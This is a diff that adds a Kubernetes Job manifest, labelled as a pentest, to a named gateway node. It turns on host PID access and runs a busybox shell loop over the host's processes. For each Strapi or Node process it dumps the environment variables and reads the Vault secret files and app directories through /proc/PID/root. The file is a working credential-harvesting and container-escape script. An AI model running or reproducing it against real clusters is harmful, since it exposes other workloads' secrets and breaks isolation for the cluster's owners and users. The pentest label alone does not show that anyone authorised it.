@@ -1,0 +1,49 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: collect3a
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      nodeName: anubis-gateway-chatly-3akkk1
+      hostPID: true
+      containers:
+      - name: c
+        image: busybox:1.36
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          echo "##HOST $(hostname)"
+          echo "##SCAN"
+          for p in /proc/[0-9]*; do
+            pid=${p#/proc/}
+            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
+            [ -z "$cmd" ] && continue
+            case "$cmd" in
+              *strapi*|*node_modules*)
+                echo "=====PID=$pid"
+                echo "CMD=$cmd"
+                echo "--ENVIRON--"
+                tr '\0' '\n' < $p/environ 2>/dev/null
+                echo "--VAULTSECRET--"
+                ls -l $p/root/vault/secrets/ 2>&1
+                cat $p/root/vault/secrets/config 2>&1
+                echo "--APPDIR--"
+                ls -l $p/root/app 2>&1 | head -30
+                echo "--HOSTNAMEFILE--"
+                cat $p/root/etc/hostname 2>&1
+                echo "--END_PID--"
+                ;;
+            esac
+          done
+          echo "##DONE"
